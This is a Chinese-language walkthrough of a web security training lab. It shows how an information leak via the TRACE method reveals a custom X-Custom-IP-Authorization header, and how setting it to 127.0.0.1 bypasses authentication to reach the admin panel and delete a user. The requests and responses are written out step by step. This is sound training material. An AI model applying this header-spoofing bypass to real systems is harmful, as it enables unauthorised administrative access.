# 实验室：通过信息泄露绕过身份验证

本实验室的管理界面存在身份验证绕过漏洞，但若不知道前端使用的自定义 HTTP 头，则难以利用。

要解决本实验，请获取该头部名称，然后使用它绕过身份验证。访问管理界面并删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    ```

- 在攻击器暴破请求方法
    ```http
    §GET§ / HTTP/2
    Host: id.web-security-academy.net
    ```

    - 得到除 GET 外的 200 响应
        ```http
        TRACE / HTTP/2
        Host: id.web-security-academy.net
        ```

        ```http
        HTTP/2 200 OK
        Content-Type: message/http
        X-Frame-Options: SAMEORIGIN
        Content-Length: 734

        TRACE / HTTP/1.1
        Host: id.web-security-academy.net
        accept-language: zh-CN,zh;q=0.9
        upgrade-insecure-requests: 1
        user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
        accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        sec-fetch-site: none
        sec-fetch-mode: navigate
        sec-fetch-user: ?1
        sec-fetch-dest: document
        sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        accept-encoding: gzip, deflate, br
        priority: u=0, i
        Content-Length: 0
        X-Custom-IP-Authorization: ip-addr
        ```
        - 有趣的头部
            ```http
            X-Custom-IP-Authorization: ip-addr
            ```

- 尝试添加 TRACE 返回的头部
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    X-Custom-Ip-Authorization: 127.0.0.1
    ```
    - 首页新增 UI
        ```html
        <a href="/admin">
            Admin panel
        </a>
        ```
        - 揭示管理端点

- 访问管理端点
    ```http
    GET /admin HTTP/2
    Host: id.web-security-academy.net
    X-Custom-Ip-Authorization: 127.0.0.1
    ```
    - 显示管理功能
        ```html
        <div>
            <span>
                carlos -
            </span>
            <a href="/admin/delete?username=carlos">
                Delete
            </a>
        </div>
        ```

    - 访问删除功能后通关

或者在拦截代理服务器中的“匹配与替换”选项中，自动附加请求头部。从而直接使用浏览器访问
